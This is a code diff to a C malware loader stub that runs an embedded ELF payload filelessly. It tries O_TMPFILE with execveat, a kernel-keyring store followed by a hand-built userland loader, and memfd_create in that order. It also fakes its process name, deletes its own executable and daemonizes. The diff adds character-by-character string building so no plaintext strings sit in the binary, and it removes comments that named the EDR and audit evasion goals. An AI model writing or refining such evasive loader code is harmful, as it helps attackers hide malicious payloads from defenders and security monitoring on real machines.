@@ -13,9 +13,12 @@
 #include <fcntl.h>
 #include <stdio.h>
 #include <elf.h>
+#include <signal.h>
 #include <sys/mman.h>
 #include <sys/syscall.h>
 #include <sys/prctl.h>
+#include <sys/stat.h>
+#include <sys/types.h>
 #include <limits.h>
 #include <errno.h>
 #include "stub_payload.h"
@@ -38,6 +41,16 @@
 
 #ifndef AT_EMPTY_PATH
 #define AT_EMPTY_PATH 0x1000
+#endif
+
+#ifndef SYS_add_key
+#define SYS_add_key 248
+#endif
+#ifndef SYS_keyctl
+#define SYS_keyctl 250
+#endif
+#ifndef SYS_getrandom
+#define SYS_getrandom 318
 #endif
 
 #define PAGE_SZ    4096UL
@@ -89,6 +102,81 @@ static int write_all(int fd, const void *buf, size_t len) {
     return 0;
 }
 
+/* ============================================================
+ * Volatile string builders (no plaintext strings in .rodata)
+ * ============================================================ */
+static int open_devnull(void) {
+    char s[16] = {0};
+    volatile char *p = (volatile char *)s;
+    p[0]='/'; p[1]='d'; p[2]='e'; p[3]='v'; p[4]='/';
+    p[5]='n'; p[6]='u'; p[7]='l'; p[8]='l';
+    return (int)syscall(SYS_openat, AT_FDCWD, s, O_RDWR, 0);
+}
+
+static void fill_at_random(void *buf, size_t len) {
+    syscall(SYS_getrandom, buf, len, 0);
+}
+
+static void set_stub_path_env(const char *path) {
+    char s[32] = {0};
+    volatile char *p = (volatile char *)s;
+    p[0]='N'; p[1]='A'; p[2]='X'; p[3]='_'; p[4]='S';
+    p[5]='T'; p[6]='U'; p[7]='B'; p[8]='_'; p[9]='P';
+    p[10]='A'; p[11]='T'; p[12]='H';
+    setenv(s, path, 1);
+}
+
+static long add_big_key(const void *payload, size_t len) {
+    char s[16] = {0};
+    volatile char *p = (volatile char *)s;
+    p[0]='b'; p[1]='i'; p[2]='g'; p[3]='_';
+    p[4]='k'; p[5]='e'; p[6]='y';
+    return syscall(SYS_add_key, s, "", payload, len, KEY_SPEC_SESSION_KEYRING);
+}
+
+static long add_user_key(const void *payload, size_t len) {
+    char s[8] = {0};
+    volatile char *p = (volatile char *)s;
+    p[0]='u'; p[1]='s'; p[2]='e'; p[3]='r';
+    return syscall(SYS_add_key, s, "", payload, len, KEY_SPEC_SESSION_KEYRING);
+}
+
+static void daemonize_and_detach(void) {
+    pid_t pid;
+
+    pid = fork();
+    if (pid < 0) _exit(1);
+    if (pid > 0) _exit(0);
+
+    setsid();
+
+    pid = fork();
+    if (pid < 0) _exit(1);
+    if (pid > 0) _exit(0);
+
+    int devnull = open_devnull();
+    if (devnull >= 0) {
+        dup2(devnull, 0);
+        dup2(devnull, 1);
+        dup2(devnull, 2);
+        if (devnull > 2) sc_close(devnull);
+    }
+
+    /* SIG_IGN is preserved across execve */
+    struct sigaction sa;
+    memset(&sa, 0, sizeof(sa));
+    sa.sa_handler = SIG_IGN;
+    sigaction(SIGHUP,  &sa, NULL);
+    sigaction(SIGINT,  &sa, NULL);
+    sigaction(SIGQUIT, &sa, NULL);
+    sigaction(SIGTSTP, &sa, NULL);
+    sigaction(SIGTTIN, &sa, NULL);
+    sigaction(SIGTTOU, &sa, NULL);
+    sigaction(SIGPIPE, &sa, NULL);
+
+    chdir("/");
+}
+
 /* Camouflage setup */
 static void setup_camo(char *s_comm, char *s_dbus, char *s_arg1, char *s_arg2,
                        char *s_arg3, char *s_arg4, char *s_arg5, char *s_arg6) {
@@ -127,26 +215,18 @@ static void setup_camo(char *s_comm, char *s_dbus, char *s_arg1, char *s_arg2,
     p[8]='-';p[9]='o';p[10]='n';p[11]='l';p[12]='y';
 }
 
-/* Self-delete + NAX_STUB_PATH */
+/* Self-delete + NAX_STUB_PATH (must run BEFORE chdir("/")) */
 static void self_delete(char **argv) {
     char stub_path[4096];
     if (realpath(argv[0], stub_path) == NULL) {
         strncpy(stub_path, argv[0], sizeof(stub_path) - 1);
         stub_path[sizeof(stub_path) - 1] = '\0';
     }
-    setenv("NAX_STUB_PATH", stub_path, 1);
-
-    /* Also try to unlink now */
-    char self_exe[PATH_MAX] = {0};
-    ssize_t n = readlink("/proc/self/exe", self_exe, sizeof(self_exe) - 1);
-    if (n > 0) sc_unlink(self_exe);
+    set_stub_path_env(stub_path);
+    sc_unlink(stub_path);
 }
 
-/* TECHNIQUE 1: O_TMPFILE + execveat(AT_EMPTY_PATH)
- * - No memfd_create (monitored by EDR)
- * - No directory entry → no IN_CREATE / FAN_CREATE events
- * - Process shows as /tmp/#N (deleted) — looks like a normal temp file
- */
+/* TECHNIQUE 1: O_TMPFILE + execveat(AT_EMPTY_PATH) */
 static int exec_otmpfile(const unsigned char *elf, size_t elf_len,
                          char *const argv[], char *const envp[]) {
 
@@ -165,7 +245,6 @@ static int exec_otmpfile(const unsigned char *elf, size_t elf_len,
 
     if (fd < 0) return -1;
 
-
     if (write_all(fd, elf, elf_len) < 0) { sc_close(fd); return -1; }
 
     char fdpath[64] = {0};
@@ -183,10 +262,9 @@ static int exec_otmpfile(const unsigned char *elf, size_t elf_len,
     if (ro_fd < 0) { sc_close(fd); return -1; }
     sc_close(fd);
 
-    /* Execute with AT_EMPTY_PATH — no path string, harder to intercept */
     sc_execveat(ro_fd, "", argv, envp, AT_EMPTY_PATH);
 
-    /* If execveat failed, try classic execve as fallback */
+    /* Fallback: /proc/self/fd/ro_fd via execve */
     fdpath[0] = '\0';
     { volatile char *p = (volatile char *)fdpath;
       p[0]='/';p[1]='p';p[2]='r';p[3]='o';p[4]='c';p[5]='/';
@@ -203,12 +281,7 @@ static int exec_otmpfile(const unsigned char *elf, size_t elf_len,
     return -1;
 }
 
-/* TECHNIQUE 2: Kernel keyring (big_key) + userland exec
- * - No fd, no inode, no VFS involvement
- * - Payload stored in kernel slab/encrypted tmpfs
- * - Execution via direct PT_LOAD mapping + jump — no execve at all
- * - Invisible to fanotify and most audit frameworks
- */
+/* TECHNIQUE 2: Kernel keyring + userland exec */
 #ifdef __x86_64__
 static __attribute__((noreturn)) void enter_elf(uintptr_t entry, uintptr_t sp) {
     register uintptr_t r_entry __asm__("rdi") = entry;
@@ -268,8 +341,7 @@ static uintptr_t build_stack(void *stk_top, int argc, char **argv, char **envp,
     sp &= ~15UL;
     sp -= 16;
     uintptr_t at_random = sp;
-    { int rfd = open("/dev/urandom", O_RDONLY);
-      if (rfd >= 0) { read(rfd, (void *)sp, 16); close(rfd); } }
+    fill_at_random((void *)sp, 16);
 
     sp &= ~15UL;
     if ((17 + argc + envc) % 2 != 0) sp -= 8;
@@ -296,46 +368,38 @@ static uintptr_t build_stack(void *stk_top, int argc, char **argv, char **envp,
 
 static int exec_keyring(const unsigned char *elf, size_t elf_len,
                         char *const argv[], char *const envp[]) {
-    /* Store ELF in kernel keyring (big_key for payloads > 20KB) */
     long key;
-    if (elf_len > 1048576) return -1; /* big_key max is 1 MiB */
+    if (elf_len > 1048576) return -1;
 
-    key = syscall(248, "big_key", "", elf, (long)elf_len,
-                  (long)KEY_SPEC_SESSION_KEYRING);
+    key = add_big_key(elf, elf_len);
     if (key < 0) {
-        /* Fallback to user key if big_key not available */
         if (elf_len > 20000) return -1;
-        key = syscall(248, "user", "", elf, (long)elf_len,
-                      (long)KEY_SPEC_SESSION_KEYRING);
+        key = add_user_key(elf, elf_len);
         if (key < 0) return -1;
     }
 
-    /* Read back from kernel memory */
-    long sz = syscall(250, (long)KEYCTL_READ, key, 0L, 0L);
+    long sz = syscall(SYS_keyctl, (long)KEYCTL_READ, key, 0L, 0L);
     if (sz < 0) return -1;
 
     unsigned char *kbuf = mmap(NULL, (size_t)sz, PROT_READ | PROT_WRITE,
                                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
     if (kbuf == MAP_FAILED) return -1;
 
-    if (syscall(250, (long)KEYCTL_READ, key, (long)kbuf, sz) < 0) {
-        munmap(kbuf, sz); return -1;
+    if (syscall(SYS_keyctl, (long)KEYCTL_READ, key, (long)kbuf, sz) < 0) {
+        munmap(kbuf, (size_t)sz); return -1;
     }
 
-    /* Revoke key — payload is now only in our mapping */
-    syscall(250, (long)KEYCTL_REVOKE, key, 0L, 0L);
+    syscall(SYS_keyctl, (long)KEYCTL_REVOKE, key, 0L, 0L);
 
-    /* Validate ELF */
-    if ((size_t)sz < sizeof(Elf64_Ehdr)) { munmap(kbuf, sz); return -1; }
+    if ((size_t)sz < sizeof(Elf64_Ehdr)) { munmap(kbuf, (size_t)sz); return -1; }
     Elf64_Ehdr *eh = (Elf64_Ehdr *)kbuf;
-    if (memcmp(eh->e_ident, ELFMAG, 4) != 0) { munmap(kbuf, sz); return -1; }
-    if (eh->e_ident[EI_CLASS] != ELFCLASS64) { munmap(kbuf, sz); return -1; }
+    if (memcmp(eh->e_ident, ELFMAG, 4) != 0) { munmap(kbuf, (size_t)sz); return -1; }
+    if (eh->e_ident[EI_CLASS] != ELFCLASS64) { munmap(kbuf, (size_t)sz); return -1; }
 
     int is_pie = (eh->e_type == ET_DYN);
     uintptr_t load_bias = 0;
     Elf64_Phdr *ph = (Elf64_Phdr *)(kbuf + eh->e_phoff);
 
-    /* Calculate load bias for PIE */
     if (is_pie) {
         uintptr_t lo = UINTPTR_MAX, hi = 0;
         for (int i = 0; i < eh->e_phnum; i++) {
@@ -347,12 +411,11 @@ static int exec_keyring(const unsigned char *elf, size_t elf_len,
         size_t total = PAGE_UP(hi) - PAGE_DN(lo);
         void *hint = mmap(NULL, total, PROT_NONE,
                           MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
-        if (hint == MAP_FAILED) { munmap(kbuf, sz); return -1; }
+        if (hint == MAP_FAILED) { munmap(kbuf, (size_t)sz); return -1; }
         munmap(hint, total);
         load_bias = (uintptr_t)hint - PAGE_DN(lo);
     }
 
-    /* Map PT_LOAD segments */
     for (int i = 0; i < eh->e_phnum; i++) {
         if (ph[i].p_type != PT_LOAD) continue;
 
@@ -366,10 +429,10 @@ static int exec_keyring(const unsigned char *elf, size_t elf_len,
 
         void *seg = mmap((void *)seg_va, seg_len, PROT_READ | PROT_WRITE,
                          MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED_NOREPLACE, -1, 0);
-        if (seg == MAP_FAILED || seg != (void *)seg_va) { munmap(kbuf, sz); return -1; }
+        if (seg == MAP_FAILED || seg != (void *)seg_va) { munmap(kbuf, (size_t)sz); return -1; }
 
         uintptr_t dst = ph[i].p_vaddr + load_bias;
-        if (ph[i].p_offset + ph[i].p_filesz > (size_t)sz) { munmap(kbuf, sz); return -1; }
+        if (ph[i].p_offset + ph[i].p_filesz > (size_t)sz) { munmap(kbuf, (size_t)sz); return -1; }
         memcpy((void *)dst, kbuf + ph[i].p_offset, ph[i].p_filesz);
 
         if (ph[i].p_memsz > ph[i].p_filesz)
@@ -378,7 +441,6 @@ static int exec_keyring(const unsigned char *elf, size_t elf_len,
         mprotect((void *)seg_va, seg_len, prot);
     }
 
-    /* Find PT_PHDR */
     uintptr_t phdr_va = 0;
     for (int i = 0; i < eh->e_phnum; i++) {
         if (ph[i].p_type == PT_PHDR) { phdr_va = ph[i].p_vaddr + load_bias; break; }
@@ -388,16 +450,13 @@ static int exec_keyring(const unsigned char *elf, size_t elf_len,
     uint16_t phnum = eh->e_phnum;
     uint16_t phentsz = eh->e_phentsize;
 
-    /* Done with the kernel buffer */
-    munmap(kbuf, sz);
+    munmap(kbuf, (size_t)sz);
 
-    /* Build stack and jump — no execve, no VFS */
     size_t stk_sz = 8 * 1024 * 1024;
     void *stk = mmap(NULL, stk_sz, PROT_READ | PROT_WRITE,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
     if (stk == MAP_FAILED) return -1;
 
-    /* Count argv */
     int argc = 0;
     while (argv[argc]) argc++;
 
@@ -405,11 +464,10 @@ static int exec_keyring(const unsigned char *elf, size_t elf_len,
                                (char **)argv, (char **)envp,
                                entry, phdr_va, phnum, phentsz);
     enter_elf(entry, sp);
-    /* never returns */
     return -1;
 }
 
-/* TECHNIQUE 3: memfd_create fallback (original stub method) */
+/* TECHNIQUE 3: memfd_create fallback */
 static int exec_memfd(const unsigned char *elf, size_t elf_len,
                       char *const argv[], char *const envp[]) {
     int fd = (int)syscall(SYS_memfd_create, "", 0);
@@ -457,17 +515,16 @@ int main(int argc, char **argv, char **envp) {
 
     prctl(PR_SET_NAME, s_comm, 0, 0, 0);
     setsid();
+
+    /* 4. Self-delete while cwd is still valid (realpath needs it) */
     self_delete(argv);
 
-    /* 4. Execute  try techniques in order of evasion */
+    /* 5. Daemonize: double fork + setsid + /dev/null + ignore signals */
+    daemonize_and_detach();
 
-    /* Technique 1: O_TMPFILE + execveat (most evasive with execve) */
+    /* 6. Execute — try techniques in order of evasion */
     exec_otmpfile(buf, stub_payload_len, fake_argv, envp);
-
-    /* Technique 2: Kernel keyring + userland exec (no execve at all) */
     exec_keyring(buf, stub_payload_len, fake_argv, envp);
-
-    /* Technique 3: memfd_create fallback (last resort) */
     exec_memfd(buf, stub_payload_len, fake_argv, envp);
 
     /* All techniques failed */
